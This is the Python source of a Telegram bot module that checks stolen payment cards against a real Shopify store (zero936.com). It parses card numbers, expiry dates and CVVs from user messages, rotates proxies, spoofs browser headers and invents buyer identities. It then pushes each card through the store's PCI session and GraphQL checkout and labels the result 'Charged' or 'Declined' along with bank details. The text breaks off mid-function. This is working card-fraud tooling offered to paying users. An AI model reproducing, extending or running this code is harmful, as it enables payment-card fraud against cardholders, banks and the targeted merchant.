# BOT/gates/charge/shopify/shopify104.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py")
except ImportError as e:
    print(f"❌ Filter import error: {e}")
    FILTER_AVAILABLE = False
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify104")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify104: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== INTELLIGENT CARD PARSING ==========
def strip_all_unicode(text):
    try:
        normalized = unicodedata.normalize('NFKD', text)
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    cleaned = re.sub(r'\s+', ' ', cleaned)
    
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    digits = re.findall(r'\d+', text)
    
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    current_year = datetime.now().year % 100
                    
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    cleaned_text = strip_all_unicode(card_input)
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None
# ========== END OF INTELLIGENT CARD PARSING ==========

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SCH-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY SHOPIFY CHARGE 104]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: zero936.com (Shopify Protection)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="sp"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 1.00$ 💷")
    except:
        gateway = "Shopify Charge 1.00$ 💷"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response or "PROCESSED_RECEIPT" in raw_response.upper():
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "CHARGED" in raw_response.upper():
            response_display = "CHARGED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "PROCESSEDRECEIPT",
            "THANK YOU", "PAYMENT_SUCCESSFUL", "PROCESSINGRECEIPT", "AUTHORIZED",
            "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "ACTION_REQUIRED"
        ]):
            status_flag = "Approved ❎"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 1.00$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== DIRECT CHECKOUT CLASS (NO ADD TO CART) ==========
class RouteChargeCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://zero936.com"
        
        # Direct checkout variant ID
        self.variant_id = "51087094219071"
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False

        # Session
        self.client = None

        # Headers
        self.headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }

        # Dynamic data
        self.checkout_token = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.build_id = None
        self.payment_method_identifier = None
        self.signed_handles = []
        self.cart_token = None
        self.client_id = None
        
        # Random data
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
        self.phone = f"215{random.randint(100,999)}{random.randint(1000,9999)}"

        self.logger = ShopifyLogger(user_id)

    async def random_delay(self, min_sec=0.1, max_sec=0.3):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def generate_uuid(self):
        return str(uuid.uuid4())

    def get_random_address(self):
        streets = ["Maple St", "Oak Ave", "Washington Blvd", "Lakeview Dr"]
        cities = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601")]
        street = f"{random.randint(100,9999)} {random.choice(streets)}"
        city, state, zp = random.choice(cities)
        return {
            "firstName": self.first_name,
            "lastName": self.last_name,
            "address1": street,
            "city": city,
            "zoneCode": state,
            "postalCode": zp,
            "countryCode": "US",
            "phone": self.phone
        }

    async def direct_checkout_access(self):
        """Step 1: Direct checkout access - gets token in one step"""
        self.step(1, "DIRECT CHECKOUT ACCESS", f"Accessing checkout: {self.base_url}/checkout/{self.variant_id}:1")
        
        checkout_url = f"{self.base_url}/checkout/{self.variant_id}:1"
        
        try:
            resp = await self.client.get(checkout_url, follow_redirects=True, timeout=30)
            final_url = str(resp.url)
            
            # Extract checkout token from URL
            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', final_url)
            if match:
                self.checkout_token = match.group(1)
                self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...")
                
                # Also try to get session token from cookies
                for cookie in self.client.cookies.jar:
                    if cookie.name == '_shopify_s':
                        self.session_token = cookie.value
                        self.logger.data_extracted("Session Token (Cookie)", self.session_token[:20] + "...")
                        break
                
                return True, final_url
            
            return False, "No checkout token found"
            
        except Exception as e:
            self.logger.error_log("CHECKOUT_ACCESS", str(e)[:50])
            return False, str(e)[:50]

    async def extract_checkout_metadata(self):
        """Step 2: Extract all required metadata from checkout page"""
        self.step(2, "EXTRACT METADATA", "Extracting tokens from checkout page")
        
        checkout_page_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}"
        
        try:
            resp = await self.client.get(checkout_page_url, timeout=30)
            html_content = resp.text
            
            # Extract session token
            session_patterns = [
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
            ]
            for pattern in session_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.session_token = match.group(1)
                    break
            
            if self.session_token:
                self.logger.data_extracted("Session Token", self.session_token[:20] + "...")
            
            # Extract queue token
            queue_patterns = [
                r'queueToken&quot;:&quot;([^&]+)&quot;',
                r'"queueToken"\s*:\s*"([^"]+)"',
            ]
            for pattern in queue_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.queue_token = match.group(1)
                    break
            
            if self.queue_token:
                self.logger.data_extracted("Queue Token", self.queue_token[:20] + "...")
            
            # Extract stable ID
            stable_patterns = [
                r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            ]
            for pattern in stable_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.stable_id = match.group(1)
                    break
            
            if not self.stable_id:
                self.stable_id = self.generate_uuid()
            
            # Extract payment method identifier
            pm_patterns = [
                r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
                r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"',
            ]
            for pattern in pm_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.payment_method_identifier = match.group(1)
                    break
            
            # Extract build ID
            build_patterns = [
                r'"buildId"\s*:\s*"([a-f0-9]{40})"',
                r'/build/([a-f0-9]{40})/',
            ]
            for pattern in build_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.build_id = match.group(1)
                    break
            
            if not self.build_id:
                self.build_id = '4663384ede457d59be87980de7797171b19f2a1b'
            
            # Extract signed handles
            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html_content)
            if not signed_handles:
                signed_handles = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html_content)
            self.signed_handles = [h.replace('\\n', '').replace('\\r', '') for h in signed_handles]
            
            return True
            
        except Exception as e:
            self.logger.error_log("METADATA", str(e)[:50])
            return False

    async def create_pci_session(self, cc, mes, ano, cvv):
        """Step 3: Create PCI payment session"""
        self.step(3, "CREATE PCI SESSION", "Creating payment session")
        
        pci_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': f'https://checkout.pci.shopifyinc.com/build/{self.build_id[:7]}/number-ltr.html',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.headers['user-agent']
        }
        
        address = self.get_random_address()
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": int(mes),
                "year": int(year_full),
                "verification_value": cvv,
                "name": f"{address['firstName']} {address['lastName']}",
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": "zero936.com"
        }
        
        try:
            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as pci_client:
                resp = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=pci_headers,
                    json=pci_payload
                )
                
                if resp.status_code in (200, 201):
                    payment_id = resp.json().get('id')
                    if payment_id:
                        self.logger.data_extracted("Payment Session ID", payment_id[:20] + "...")
                        return True, payment_id
                
                return False, f"PCI failed: {resp.status_code}"
                
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e)[:50])
            return False, "PCI_ERROR"

    async def submit_payment(self, payment_session_id):
        """Step 4: Submit payment via GraphQL"""
        self.step(4, "SUBMIT PAYMENT", "Submitting payment")
        
        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
        
        graphql_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}",
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.headers['user-agent'],
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-build-id': self.build_id
        }
        
        address = self.get_random_address()
        attempt_token = f"{self.checkout_token}-{self.generate_uuid()[:8]}"
        pm_identifier = self.payment_method_identifier or payment_session_id
        
        delivery_lines = []
        for sh in self.signed_handles[:1]:
            delivery_lines.append({
                "signedHandle": sh,
                "expectedDeliveryDate": {"any": True}
            })
        
        MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter queueToken __typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'''
        
        payload = {
            "query": MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}",
                    "pageId": self.generate_uuid().upper()
                },
                "input": {
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address['address1'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": address['countryCode'],
                                    "postalCode": address['postalCode'],
                                    "firstName": address['firstName'],
                                    "lastName": address['lastName'],
                                    "zoneCode": address['zoneCode'],
                                    "phone": address['phone']
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                }
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": delivery_lines},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties": []
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True}
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pm_identifier,
                                    "sessionId": payment_session_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address['address1'],
                                            "address2": "",
                                            "city": address['city'],
                                            "countryCode": address['countryCode'],
                                            "postalCode": address['postalCode'],
                                            "firstName": address['firstName'],
                                            "lastName": address['lastName'],
                                            "zoneCode": address['zoneCode'],
                                            "phone": address['phone']
                                        }
                                    }
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address['address1'],
                                "address2": "",
                                "city": address['city'],
                                "countryCode": address['countryCode'],
                                "postalCode": address['postalCode'],
                                "firstName": address['firstName'],
                                "lastName": address['lastName'],
                                "zoneCode": address['zoneCode'],
                                "phone": address['phone']
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email": self.email,
                        "emailChanged": False,
                        "phoneCountryCode": "US",
                        "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {"proposedTotalAmount": {"any": True}},
                    "note": {"message": None, "customAttributes": []}
                }
            }
        }
        
        try:
            resp = await self.client.post(graphql_url, json=payload, headers=graphql_headers, timeout=30)
            
            if resp.status_code != 200:
                return False, f"Submit failed: {resp.status_code}"
            
            result = resp.json()
            
            if 'errors' in result:
                return False, f"DECLINED - {result['errors'][0].get('message', 'GraphQL Error')[:50]}"
            
            data = result.get('data', {}).get('submitForCompletion', {})
            typename = data.get('__typename', '')
            
            if typename == 'SubmitSuccess':
                receipt = data.get('receipt', {})
                receipt_id = receipt.get('id')
                if receipt_id:
                    return True, receipt_id
                return False, "DECLINED - No receipt ID"
            
            elif typename == 'SubmitFailed':
                reason = data.get('reason', 'Unknown')
                return False, f"DECLINED - {reason}"
